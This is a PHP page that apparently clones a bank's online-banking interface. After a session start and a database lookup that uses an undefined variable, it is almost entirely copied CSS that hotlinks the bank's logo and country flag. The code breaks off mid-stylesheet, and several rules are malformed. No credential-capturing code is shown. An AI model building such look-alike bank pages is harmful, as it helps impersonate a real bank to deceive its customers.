<?php
// Inicia la sesión
session_start();

// Conectar a la base de datos
include 'db.php';  // Asegúrate de tener el archivo de conexión a la base de datos

// Obtener información del usuario (si es necesario)
$stmt = $conn->prepare("SELECT usuario FROM usuarios WHERE id = :id");
$stmt->bindParam(':id', $user_id, PDO::PARAM_INT);
$stmt->execute();
$user = $stmt->fetch(PDO::FETCH_ASSOC);

?>

<html>

<head>
    <style>
        .style-0 {
            position: inherit;
            cursor: auto;
            cursor: auto;
            margin: 0px;
            background-image: url('background.svg');
        }

        .style-1 {
            z-index: 10background-color: rgb(255, 255, 255);
            position: relative;
            box-shadow: rgba(0, 0, 0, 0.2) 0px 0px 15px 0px;
            margin-left: auto;
            margin-right: auto;
            width: 100%;
            height: auto;
            box-sizing: border-box;
        }

        .style-2 {
            padding-right: 25px;
            padding-left: 25px;
            align-items: center;
            display: flex;
            flex-wrap: wrap;
            margin: auto;
            width: 100%;
            box-sizing: border-box;
        }

        .style-3 {
            background: rgba(0, 0, 0, 0) url('https://www.sucursalelectronica.com/redir/redir2.0/images/module/login/logo_header.svg') no-repeat scroll 0% 0% / 300px padding-box border-box;
            height: 36px;
            padding: 0px;
            cursor: pointer;
            list-style: outside none none;
            flex: 0 0 50%;
            max-width: 50%;
            position: relative;
            box-sizing: border-box;
        }

        .style-4 {
            padding-top: 25px;
            padding-bottom: 25px;
            margin: 0px;
            align-items: center;
            justify-content: flex-end;
            display: flex;
            flex: 0 0 50%;
            max-width: 50%;
            position: relative;
            box-sizing: border-box;
        }

        .style-5 {
            display: flex;
            align-items: center;
            cursor: pointer;
            list-style: outside none none;
            box-sizing: border-box;
        }

        .style-6 {
            font-size: 14px;
            text-decoration: none solid rgb(0, 0, 0);
            align-items: center;
            justify-content: center;
            display: flex;
            color: rgb(0, 0, 0);
            font-weight: 400;
            line-height: 21px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-7 {
            font-size: 16px;
            font-style: normal;
            line-height: normal;
            font-family: blue-iconset, Helvetica, sans-serif;
            box-sizing: border-box;
        }

        .style-8 {
            font-size: 16px;
            padding-left: 10px;
            box-sizing: border-box;
        }

        .style-9 {
            padding-left: 25px;
            align-items: center;
            cursor: pointer;
            display: flex;
            list-style: outside none none;
            box-sizing: border-box;
        }

        .style-10 {
            text-decoration: none solid rgb(0, 0, 0);
            align-items: center;
            display: flex;
            box-sizing: border-box;
        }

        .style-11 {
            background: rgba(0, 0, 0, 0) url('https://www.sucursalelectronica.com/assets/images/flags/round/CR.svg') repeat scroll 0% 0% / auto padding-box border-box;
            height: 30px;
            width: 30px;
            box-sizing: border-box;
        }

        .style-12 {
            display: block;
            font-size: 16px;
            font-weight: 600;
            margin-left: 5px;
            width: 28px;
            color: rgb(109, 110, 113);
            line-height: 24px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-13 {
            display: block;
            color: rgb(77, 77, 79);
            margin-right: 5px;
            font-size: 16px;
            font-style: normal;
            line-height: normal;
            font-family: blue-iconset, Helvetica, sans-serif;
            box-sizing: border-box;
        }

        .style-14 {
            position: absolute;
            top: 100%;
            right: 0px;
            z-index: 10;
            display: none;
            min-width: 160px;
            text-align: left;
            list-style: outside none none;
            background-color: rgb(255, 255, 255);
            -webkit-background-clip: padding-box;
            border: 0.8px solid rgba(0, 0, 0, 0.15);
            box-shadow: rgba(0, 0, 0, 0.2) 0px 0px 15px 0px;
            box-sizing: border-box;
        }

        .style-15 {
            font-size: 16px;
            display: block;
            padding: 20px;
            clear: both;
            text-align: center;
            white-space: nowrap;
            background-color: rgba(0, 0, 0, 0);
            border-bottom: 0.8px solid rgb(230, 230, 230);
            text-decoration: none solid rgb(0, 0, 0);
            color: rgb(0, 0, 0);
            font-weight: 400;
            line-height: 24px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-16 {
            font-size: 16px;
            display: block;
            padding: 20px;
            clear: both;
            text-align: center;
            white-space: nowrap;
            background-color: rgba(0, 0, 0, 0);
            border-bottom: 0.8px solid rgb(230, 230, 230);
            text-decoration: none solid rgb(0, 0, 0);
            color: rgb(0, 0, 0);
            font-weight: 400;
            line-height: 24px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-17 {
            font-size: 16px;
            display: block;
            padding: 20px;
            clear: both;
            text-align: center;
            white-space: nowrap;
            background-color: rgba(0, 0, 0, 0);
            border-bottom: 0.8px solid rgb(230, 230, 230);
            text-decoration: none solid rgb(0, 0, 0);
            color: rgb(0, 0, 0);
            font-weight: 400;
            line-height: 24px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-18 {
            font-size: 16px;
            display: block;
            padding: 20px;
            clear: both;
            text-align: center;
            white-space: nowrap;
            background-color: rgba(0, 0, 0, 0);
            border-bottom: 0.8px solid rgb(230, 230, 230);
            text-decoration: none solid rgb(0, 0, 0);
            color: rgb(0, 0, 0);
            font-weight: 400;
            line-height: 24px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-19 {
            font-size: 16px;
            display: block;
            padding: 20px;
            clear: both;
            text-align: center;
            white-space: nowrap;
            background-color: rgba(0, 0, 0, 0);
            border-bottom: 0.8px solid rgb(230, 230, 230);
            text-decoration: none solid rgb(0, 0, 0);
            color: rgb(0, 0, 0);
            font-weight: 400;
            line-height: 24px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-20 {
            font-size: 16px;
            border-bottom: 0px none rgb(0, 0, 0);
            display: block;
            padding: 20px;
            clear: both;
            text-align: center;
            white-space: nowrap;
            background-color: rgba(0, 0, 0, 0);
            text-decoration: none solid rgb(0, 0, 0);
            color: rgb(0, 0, 0);
            font-weight: 400;
            line-height: 24px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-21 {
            display: none;
            padding-left: 10px;
            cursor: pointer;
            list-style: outside none none;
            box-sizing: border-box;
        }

        .style-22 {
            text-decoration: none solid rgb(0, 0, 0);
            box-sizing: border-box;
        }

        .style-23 {
            color: rgb(77, 77, 79);
            font-size: 24px;
            font-style: normal;
            line-height: normal;
            font-family: blue-iconset, Helvetica, sans-serif;
            box-sizing: border-box;
        }

        .style-24 {
            position: absolute;
            top: 100%;
            right: 0px;
            z-index: 10;
            display: none;
            min-width: 160px;
            text-align: left;
            list-style: outside none none;
            background-color: rgb(255, 255, 255);
            -webkit-background-clip: padding-box;
            border: 0.8px solid rgba(0, 0, 0, 0.15);
            box-shadow: rgba(0, 0, 0, 0.2) 0px 0px 15px 0px;
            box-sizing: border-box;
        }

        .style-25 {
            font-size: 16px;
            text-decoration: none solid rgb(0, 0, 0);
            display: block;
            padding: 20px;
            clear: both;
            text-align: center;
            white-space: nowrap;
            background-color: rgba(0, 0, 0, 0);
            border-bottom: 0.8px solid rgb(230, 230, 230);
            color: rgb(0, 0, 0);
            font-weight: 400;
            line-height: 24px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-26 {
            font-size: 16px;
            text-decoration: none solid rgb(0, 0, 0);
            align-items: center;
            justify-content: center;
            display: flex;
            border-bottom: 0px none rgb(0, 0, 0);
            padding: 20px;
            clear: both;
            text-align: center;
            white-space: nowrap;
            background-color: rgba(0, 0, 0, 0);
            color: rgb(0, 0, 0);
            font-weight: 400;
            line-height: 24px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-27 {
            font-size: 16px;
            font-style: normal;
            line-height: normal;
            font-family: blue-iconset, Helvetica, sans-serif;
            box-sizing: border-box;
        }

        .style-28 {
            padding-left: 10px;
            box-sizing: border-box;
        }

        .style-29 {
            display: block;
            flex-wrap: wrap;
            margin: auto;
            width: 100%;
            box-sizing: border-box;
        }

        .style-30 {
            display: block;
            height: 1px;
            border-width: 0px 0px 0.8px;
            border-top-style: none;
            border-right-style: none;
            border-left-style: none;
            border-top-color: rgb(0, 0, 0);
            border-right-color: rgb(0, 0, 0);
            border-left-color: rgb(0, 0, 0);
            border-image: none;
            margin: 0px;
            padding: 0px;
            border-bottom-style: solid;
            border-bottom-color: rgb(221, 221, 221);
            flex: 0 0 100%;
            max-width: 100%;
            position: relative;
            box-sizing: border-box;
        }

        .style-31 {
            display: block;
            flex-wrap: wrap;
            margin: auto;
            width: 100%;
            box-sizing: border-box;
        }

        .style-32 {
            height: 40pxalign-items:center;
            justify-content: center;
            display: flex;
            flex: 0 0 100%;
            max-width: 100%;
            padding: 0px 10px;
            position: relative;
            box-sizing: border-box;
        }

        .style-33 {
            position: relative;
            box-sizing: border-box;
        }

        .style-34 {
            font-size: 14px;
            font-weight: 500;
            align-items: center;
            display: flex;
            cursor: pointer;
            line-height: 0px;
            text-decoration: none solid rgb(16, 117, 187);
            color: rgb(16, 117, 187);
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-35 {
            margin-right: 5px;
            font-size: 16px;
            font-style: normal;
            line-height: normal;
            font-family: blue-iconset, Helvetica, sans-serif;
            box-sizing: border-box;
        }

        .style-36 {
            font-size: 16px;
            margin-right: 5px;
            box-sizing: border-box;
        }

        .style-37 {
            box-sizing: border-box;
        }

        .style-38 {
            margin-right: 5px;
            font-size: 16px;
            font-style: normal;
            line-height: normal;
            font-family: blue-iconset, Helvetica, sans-serif;
            box-sizing: border-box;
        }

        .style-39 {
            --width: 350px;
            --xPos: calc(126px - 0px);
            --yPos: calc(28px);
            --radius: 4px;
            --background: var(--c-white);
            --indicator-position-arrow: 90%;
            --indicator-position-element-reference: 75%;
            --zIndex: 700;
            --anim-name-in: fade-in-right;
            --anim-name-out: fade-out-left;
            --anim-time: 0.2s;
            --anim-delay: 0.2s;
            --xPos: calc(126px - 0px);
            --yPos: calc(28px);
            --radius: 4px;
            --background: var(--c-white);
            --indicator-position-arrow: 90%;
            --indicator-position-element-reference: 75%;
            --zIndex: 700;
            --anim-name-in: fade-in-right;
            --anim-name-out: fade-out-left;
            --anim-time: 0.2s;
            --anim-delay: 0.2s;
            margin-top: 25px;
            display: none;
            box-sizing: border-box;
            visibility: hidden;
            border-radius: 4px;
            width: 350px;
            box-shadow: rgba(0, 0, 0, 0.3) 0px 9px 15px 0px;
            top: 28px;
            left: 126px;
            z-index: 700;
            position: absolute;
            background: rgb(255, 255, 255) none repeat scroll 0% 0% / auto padding-box border-box;
        }

        .style-40 {
            padding: 25px;
            box-sizing: border-box;
        }

        .style-41 {
            padding-right: 15px;
            padding-left: 15px;
            box-sizing: border-box;
        }

        .style-42 {
            box-sizing: border-box;
        }

        .style-43 {
            padding: 0px;
            margin-top: 15px;
            margin-right: 15px;
            margin-left: 15px;
            flex: 0 0 100%;
            max-width: 100%;
            position: relative;
            box-sizing: border-box;
        }

        .style-44 {
            font-size: 12px;
            font-weight: 500;
            color: rgb(109, 110, 113);
            line-height: 18px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-45 {
            padding-right: 0px;
            padding-left: 0px;
            margin-top: 10px;
            justify-content: space-between;
            display: flex;
            flex: 0 0 100%;
            max-width: 100%;
            position: relative;
            box-sizing: border-box;
        }

        .style-46 {
            padding: 0px;
            flex: 0 0 50%;
            max-width: 50%;
            position: relative;
            box-sizing: border-box;
        }

        .style-47 {
            padding-right: 5px;
            padding-left: 15px;
            box-sizing: border-box;
        }

        .style-48 {
            height: 0px;
            width: 0px;
            position: absolute;
            margin: 0px;
            opacity: 0;
            box-sizing: border-box;
        }

        .style-49 {
            color: rgb(16, 117, 187);
            background-color: rgb(247, 251, 253);
            border: 0.8px solid rgb(16, 117, 187);
            box-shadow: rgba(16, 117, 187, 0.24) 0px 2px 4px 0px;
            padding: 0px 15px;
            display: block;
            font-family: Graphik, Helvetica, sans-serif;
            font-size: 14px;
            height: 46px;
            cursor: pointer;
            line-height: 46px;
            box-sizing: border-box;
            width: 100%;
            text-align: center;
        }

        .style-50 {
            padding: 0px;
            flex: 0 0 50%;
            max-width: 50%;
            position: relative;
            box-sizing: border-box;
        }

        .style-51 {
            padding-right: 15px;
            padding-left: 15px;
            box-sizing: border-box;
        }

        .style-52 {
            height: 0px;
            width: 0px;
            position: absolute;
            margin: 0px;
            opacity: 0;
            box-sizing: border-box;
        }

        .style-53 {
            padding: 0px 15px;
            display: block;
            background-color: rgb(255, 255, 255);
            font-family: Graphik, Helvetica, sans-serif;
            color: rgb(109, 110, 113);
            font-size: 14px;
            height: 46px;
            cursor: pointer;
            line-height: 46px;
            border: 0.8px solid rgb(230, 230, 230);
            box-sizing: border-box;
            width: 100%;
            text-align: center;
        }

        .style-54 {
            display: block;
            height: 1px;
            border-width: 0px 0px 0.8px;
            border-top-style: none;
            border-right-style: none;
            border-left-style: none;
            border-top-color: rgb(0, 0, 0);
            border-right-color: rgb(0, 0, 0);
            border-left-color: rgb(0, 0, 0);
            border-image: none;
            margin: 25px 0px 0px;
            padding: 0px;
            border-bottom-style: solid;
            border-bottom-color: rgb(221, 221, 221);
            margin-top: 25px;
            box-sizing: border-box;
        }

        .style-55 {
            margin-top: 25px;
            margin-right: 10px;
            margin-left: 10px;
            justify-content: center;
            gap: 15px;
            display: flex;
            flex: 0 0 100%;
            max-width: 100%;
            padding: 0px 10px;
            position: relative;
            box-sizing: border-box;
        }

        .style-56 {
            font-size: 14px;
            color: rgb(77, 77, 79);
            text-align: center;
            font-weight: 600;
            margin-right: 5px;
            border: 0.8px solid rgba(0, 0, 0, 0);
            box-shadow: rgb(147, 193, 224) 0px 0px 0px 0px;
            background: rgba(0, 0, 0, 0) none repeat scroll 0px 0px / auto padding-box border-box;
            width: auto;
            height: auto;
            padding: 0px;
            line-height: 21px;
            overflow: visible;
            user-select: none;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-57 {
            box-sizing: border-box;
        }

        .style-58 {
            box-sizing: border-box;
        }

        .style-59 {
            border-left: 0.8px solid rgb(190, 190, 190);
            box-sizing: border-box;
        }

        .style-60 {
            font-size: 14px;
            color: rgb(109, 110, 113);
            text-align: center;
            margin-left: 5px;
            border: 0.8px solid rgba(0, 0, 0, 0);
            box-shadow: rgb(147, 193, 224) 0px 0px 0px 0px;
            background: rgba(0, 0, 0, 0) none repeat scroll 0px 0px / auto padding-box border-box;
            width: auto;
            height: auto;
            padding: 0px;
            line-height: 21px;
            font-weight: 400;
            overflow: visible;
            user-select: none;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-61 {
            box-sizing: border-box;
        }

        .style-62 {
            box-sizing: border-box;
        }

        .style-63 {
            padding-right: 25px;
            padding-left: 25px;
            margin-top: 10px;
            align-items: center;
            display: flex;
            box-sizing: border-box;
        }

        .style-64 {
            color: rgb(228, 0, 43);
            padding-right: 15px;
            padding-left: 15px;
            cursor: pointer;
            box-sizing: border-box;
        }

        .style-65 {
            font-size: 16px;
            font-style: normal;
            line-height: normal;
            font-family: blue-iconset, Helvetica, sans-serif;
            box-sizing: border-box;
        }

        .style-66 {
            flex-grow: 1;
            display: flex;
            box-sizing: border-box;
        }

        .style-67 {
            font-size: 14px;
            background-color: rgb(255, 255, 255);
            text-align: center;
            padding: 10px;
            margin: 0px;
            opacity: 1;
            width: 60px;
            transition: border-color 0.5s;
            border-width: 0.8px 0px 0.8px 0.8px;
            border-top-style: solid;
            border-bottom-style: solid;
            border-left-style: solid;
            border-top-color: rgb(230, 230, 230);
            border-bottom-color: rgb(230, 230, 230);
            border-left-color: rgb(230, 230, 230);
            border-image: none;
            border-right-style: none;
            border-right-color: rgb(190, 190, 190);
            outline: rgb(190, 190, 190) none 0px;
            margin-top: 0px;
            height: 45px;
            box-sizing: border-box;
            font-weight: 400;
            color: rgb(190, 190, 190);
            line-height: 21px;
            margin-bottom: 0px;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-68 {
            font-size: 14px;
            text-align: right;
            cursor: text;
            width: 100%;
            transition: border-color 0.5s;
            padding: 0px 10px;
            border: 0.8px solid rgb(230, 230, 230);
            height: 45px;
            box-sizing: border-box;
            color: rgb(0, 0, 0);
            font-weight: 400;
            line-height: 21px;
            margin-top: 0px;
            margin-bottom: 0px;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-69 {
            text-align: right;
            padding-right: 25px;
            padding-left: 25px;
            margin-bottom: 10px;
            margin-top: 15px;
            box-sizing: border-box;
        }

        .style-70 {
            font-size: 16px;
            color: rgb(43, 43, 43);
            font-weight: 500;
            line-height: 24px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-71 {
            box-sizing: border-box;
        }

        .style-72 {
            box-sizing: border-box;
        }

        .style-73 {
            font-size: 14px;
            color: rgb(43, 43, 43);
            font-weight: 600;
            line-height: 21px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-74 {
            right: 12px;
            top: 12px;
            position: absolute;
            top: 12px;
            position: absolute;
            padding-left: 0px;
            padding-right: 15px;
            padding-top: 15px;
            cursor: pointer;
            appearance: none;
            background: rgba(0, 0, 0, 0) none repeat scroll 0px 0px / auto padding-box border-box;
            border: 0px none rgb(0, 0, 0);
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            user-select: none;
            align-self: baseline;
            box-sizing: border-box;
        }

        .style-75 {
            color: rgb(158, 158, 158);
            padding: 0px;
            font-size: 13px;
            font-style: normal;
            line-height: normal;
            font-family: blue-iconset, Helvetica, sans-serif;
            box-sizing: border-box;
        }

        .style-76 {
            display: flex;
            padding-left: 40px;
            box-sizing: border-box;
        }

        .style-77 {
            align-items: center;
            border-right: 0.8px solid rgb(190, 190, 190);
            display: flex;
            box-sizing: border-box;
        }

        .style-78 {
            font-size: 14px;
            margin-right: 10px;
            color: rgb(0, 0, 0);
            font-weight: 400;
            line-height: 21px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-79 {
            font-size: 14px;
            margin-right: 15px;
            color: rgb(0, 0, 0);
            font-weight: 400;
            line-height: 21px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-80 {
            box-sizing: border-box;
        }

        .style-81 {
            font-size: 14px;
            padding-right: 40px;
            margin-left: 5px;
            margin-right: 10px;
            color: rgb(0, 0, 0);
            font-weight: 400;
            line-height: 21px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-82 {
            box-sizing: border-box;
        }

        .style-83 {
            align-items: center;
            display: flex;
            box-sizing: border-box;
        }

        .style-84 {
            font-size: 14px;
            padding-left: 40px;
            margin-left: 10px;
            margin-right: 10px;
            color: rgb(0, 0, 0);
            font-weight: 400;
            line-height: 21px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-85 {
            font-size: 14px;
            margin-right: 15px;
            color: rgb(0, 0, 0);
            font-weight: 400;
            line-height: 21px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-86 {
            box-sizing: border-box;
        }

        .style-87 {
            font-size: 14px;
            margin-left: 5px;
            margin-right: 10px;
            color: rgb(0, 0, 0);
            font-weight: 400;
            line-height: 21px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-88 {
            box-sizing: border-box;
        }

        .style-89 {
            display: none;
            box-sizing: border-box;
        }

        .style-90 {
            box-sizing: border-box;
        }

        .style-91 {
            box-sizing: border-box;
        }

        .style-92 {
            box-sizing: border-box;
        }

        .style-93 {
            box-sizing: border-box;
        }

        .style-94 {
            box-sizing: border-box;
        }

        .style-95 {
            box-sizing: border-box;
        }

        .style-96 {
            box-sizing: border-box;
        }

        .style-97 {
            max-width: 1140px;
            position: relative;
            margin: auto;
            width: 100%;
            height: auto;
        }

        .style-98 {
            padding-top: 50px;
            justify-content: center;
            display: flex;
            flex-wrap: wrap;
            margin: auto;
            width: 100%;
            box-sizing: border-box;
        }

        .style-99 {
            flex: 0 0 41.6667%;
            max-width: 41.6667%;
            padding: 0px;
            position: relative;
            box-sizing: border-box;
        }

        .style-100 {
            padding: 25px;
            padding-bottom: 25px;
            padding-top: 25px;
            box-shadow: rgba(0, 0, 0, 0.2) 0px 0px 15px 0px;
            background-color: rgb(255, 255, 255);
            width: 100%;
            box-sizing: border-box;
            border: 0.8px solid rgb(230, 230, 230);
        }

        .style-101 {
            justify-content: center;
            display: flex;
            flex-wrap: wrap;
            margin: auto;
            width: 100%;
            box-sizing: border-box;
        }

        .style-102 {
            padding-right: 0px;
            padding-left: 0px;
            justify-content: flex-end;
            display: flex;
            flex: 0 0 100%;
            max-width: 100%;
            position: relative;
            box-sizing: border-box;
        }

        .style-103 {
            padding: 0px;
            color: rgb(0, 0, 0);
            text-decoration: none solid rgb(0, 0, 0);
            padding-right: 0px;
            cursor: pointer;
            box-sizing: border-box;
        }

        .style-104 {
            font-size: 30px;
            font-style: normal;
            line-height: normal;
            font-family: blue-iconset, Helvetica, sans-serif;
            box-sizing: border-box;
        }

        .style-105 {
            padding-right: 0px;
            padding-left: 0px;
            justify-content: center;
            display: none;
            flex: 0 0 100%;
            max-width: 100%;
            position: relative;
            box-sizing: border-box;
        }

        .style-106 {
            box-sizing: border-box;
        }

        .style-107 {
            padding-right: 0px;
            padding-left: 0px;
            flex: 0 0 83.3333%;
            max-width: 83.3333%;
            position: relative;
            box-sizing: border-box;
        }

        .style-108 {
            padding-top: 10px;
            flex: 0 0 100%;
            max-width: 100%;
            position: relative;
            box-sizing: border-box;
        }

        .style-109 {
            font-size: 16px;
            text-align: center;
            color: rgb(0, 0, 0);
            font-weight: 400;
            line-height: 24px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-110 {
            flex: 0 0 100%;
            max-width: 100%;
            padding: 0px 10px;
            position: relative;
            box-sizing: border-box;
        }

        .style-111 {
            font-size: 28px;
            text-align: center;
            font-weight: 500;
            color: rgb(0, 0, 0);
            line-height: 42px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-112 {
            font-size: 28px;
            text-align: center;
            line-height: 28px;
            font-weight: 500;
            display: none;
            color: rgb(0, 0, 0);
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-113 {
            display: inline;
            box-sizing: border-box;
        }

        .style-114 {
            box-sizing: border-box;
        }

        .style-115 {
            display: inline;
            box-sizing: border-box;
        }

        .style-116 {
            align-items: center;
            display: flex;
            flex-wrap: wrap;
            margin: auto;
            width: 100%;
            box-sizing: border-box;
        }

        .style-117 {
            justify-content: flex-end;
            flex: 0 0 50%;
            max-width: 50%;
            padding-left: 1px;
            display: none;
            padding: 0px 10px 0px 1px;
            position: relative;
            box-sizing: border-box;
        }

        .style-118 {
            font-size: 28px;
            text-align: center;
            font-weight: 500;
            color: rgb(0, 0, 0);
            line-height: 42px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-119 {
            box-sizing: border-box;
        }

        .style-120 {
            box-sizing: border-box;
        }

        .style-121 {
            justify-content: flex-start;
            flex: 0 0 50%;
            max-width: 50%;
            padding: 0px;
            display: none;
            position: relative;
            box-sizing: border-box;
        }

        .style-122 {
            font-size: 14px;
            color: rgb(16, 117, 187);
            cursor: pointer;
            font-weight: 400;
            line-height: 21px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-123 {
            display: flex;
            flex-wrap: wrap;
            margin: auto;
            width: 100%;
            box-sizing: border-box;
        }

        .style-124 {
            margin-bottom: 15px;
            margin-top: 40px;
            flex: 0 0 100%;
            max-width: 100%;
            padding: 0px 10px;
            position: relative;
            box-sizing: border-box;
        }

        .style-125 {
            font-size: 14px;
            font-weight: 500;
            color: rgb(0, 0, 0);
            line-height: 21px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-126 {
            padding-right: 10px;
            padding-left: 10px;
            display: flex;
            box-sizing: border-box;
        }

        .style-127 {
            margin-bottom: 0px;
            padding-bottom: 15px;
            box-sizing: border-box;
        }

        .style-128 {
            width: 100%;
            box-sizing: border-box;
        }

        .style-129 {
            width: 0px;
            height: 0px;
            opacity: 0;
            position: absolute;
            margin: 0px;
            box-sizing: border-box;
        }

        .style-130 {
            cursor: pointer;
            user-select: none;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            display: flex;
            box-sizing: border-box;
        }

        .style-131 {
            width: 16px;
            height: 16px;
            position: relative;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            border-radius: 20px;
            box-sizing: border-box;
        }

        .style-132 {
            font-size: 14px;
            margin-left: 10px;
            color: rgb(109, 110, 113);
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-133 {
            display: blockmargin-bottom:0px;
            padding-bottom: 15px;
            margin-left: 25px;
            box-sizing: border-box;
        }

        .style-134 {
            width: 100%;
            box-sizing: border-box;
        }

        .style-135 {
            width: 0px;
            height: 0px;
            opacity: 0;
            position: absolute;
            margin: 0px;
            box-sizing: border-box;
        }

        .style-136 {
            user-select: none;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            display: flex;
            box-sizing: border-box;
        }

        .style-137 {
            width: 16px;
            height: 16px;
            cursor: pointer;
            position: relative;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            border-radius: 20px;
            box-sizing: border-box;
        }

        .style-138 {
            font-size: 14px;
            margin-left: 10px;
            color: rgb(109, 110, 113);
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-139 {
            display: flex;
            flex-wrap: wrap;
            margin: auto;
            width: 100%;
            box-sizing: border-box;
        }

        .style-140 {
            padding-top: 25px;
            flex: 0 0 100%;
            max-width: 100%;
            position: relative;
            box-sizing: border-box;
        }

        .style-141 {
            font-size: 13px;
            font-weight: 500;
            color: rgb(77, 77, 79);
            line-height: 19.5px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-142 {
            font-size: 14px;
            margin-top: 5px;
            width: 100%;
            transition: border-color 0.5s;
            padding: 0px 10px;
            border: 0.8px solid rgb(230, 230, 230);
            height: 45px;
            box-sizing: border-box;
            color: rgb(0, 0, 0);
            font-weight: 400;
            line-height: 21px;
            margin-bottom: 0px;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-143 {
            padding-top: 15px;
            justify-content: flex-end;
            flex-direction: column;
            position: relative;
            display: flex;
            flex: 0 0 100%;
            max-width: 100%;
            box-sizing: border-box;
        }

        .style-144 {
            box-sizing: border-box;
        }

        .style-145 {
            font-size: 13px;
            font-weight: 500;
            color: rgb(77, 77, 79);
            line-height: 19.5px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-146 {
            display: flex;
            box-sizing: border-box;
        }

        .style-147 {
            font-size: 14px;
            padding-right: 40px;
            margin-top: 5px;
            width: 100%;
            transition: border-color 0.5s;
            padding: 0px 40px 0px 10px;
            border: 0.8px solid rgb(230, 230, 230);
            height: 45px;
            box-sizing: border-box;
            color: rgb(0, 0, 0);
            font-weight: 400;
            line-height: 21px;
            margin-bottom: 0px;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-148 {
            visibility: hidden;
            color: rgb(0, 0, 0);
            margin-top: 5px;
            font-size: 16px;
            font-style: normal;
            line-height: normal;
            font-family: blue-iconset, Helvetica, sans-serif;
            right: 10px;
            padding: 15px;
            position: absolute;
            background-color: rgba(0, 0, 0, 0);
            border: 0px none rgb(0, 0, 0);
            cursor: pointer;
            box-sizing: border-box;
        }

        .style-149 {
            display: none;
            box-sizing: border-box;
        }

        .style-150 {
            flex: 0 0 50%;
            max-width: 50%;
            padding-top: 15px;
            display: none;
            padding: 15px 10px 0px;
            position: relative;
            box-sizing: border-box;
        }

        .style-151 {
            font-size: 13px;
            font-weight: 500;
            color: rgb(77, 77, 79);
            line-height: 19.5px;
            margin-top: 0px;
            margin-bottom: 0px;
            box-sizing: border-box;
            font-family: Graphik, Helvetica, sans-serif;
        }

        .style-152 {
            display: none;
            font-size: 14px;
            margin-top: 5px;
            width: 100%;
            transition: border-color 0.5s;
            padding: 0px 10px;
            border: 0.8px solid rgb(230, 230, 230);
            height: 45px;
            box-sizing: border-box;
